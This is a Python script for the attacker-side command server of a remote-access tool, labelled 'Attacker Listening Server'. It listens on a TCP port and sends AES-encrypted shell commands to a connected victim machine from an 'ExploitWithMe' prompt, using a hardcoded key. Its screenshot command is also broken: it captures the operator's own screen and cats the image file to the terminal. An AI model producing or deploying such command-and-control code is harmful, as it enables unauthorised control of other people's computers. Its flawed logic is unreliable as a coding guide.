import os
import socket
import sys
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import pyscreenshot as ImageGrab
PORT = 829
HOST = 'localhost'
KEY = b'82e672ae054aa4de6f042c888111686a'
def pad(s: bytes) -> bytes:
    return s + b'\0' * (AES.block_size - len(s) % AES.block_size)
def encrypt(plaintext: bytes) -> bytes:
    plaintext = pad(plaintext)
    iv = get_random_bytes(AES.block_size)
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(plaintext)
def decrypt(ciphertext: bytes) -> bytes:
    iv = ciphertext[:AES.block_size]
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext[AES.block_size:])
    return plaintext.rstrip(b'\0')
def screen_shot():
    try:
        im = ImageGrab.grab()
        im.show()
        im = ImageGrab.grab(bbox=(10, 10, 500, 500))
        im.show()
        ImageGrab.grab_to_file('im.png')
    except Exception as e:
        print(f"Error occurred while taking screenshot: {e}")
def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen(10)
        print(f'Attacker Listening Server Started on Port {PORT}...')
        conn, _ = s.accept()
        with conn:
            while True:
                try:
                    cmd = input('ExploitWithMe >> ').strip()
                    if cmd == 'grab_screen':
                        screen_shot()
                        os.system("cat im.png")
                    elif cmd == 'terminate':
                        conn.send(encrypt(cmd.encode()))
                        print("Terminating connection...")
                        break
                    elif cmd:
                        conn.send(encrypt(cmd.encode()))
                        data = conn.recv(4096)
                        print(decrypt(data).decode())
                except Exception as e:
                    print(f"An error occurred: {e}")
                    break
if __name__ == '__main__':
    main()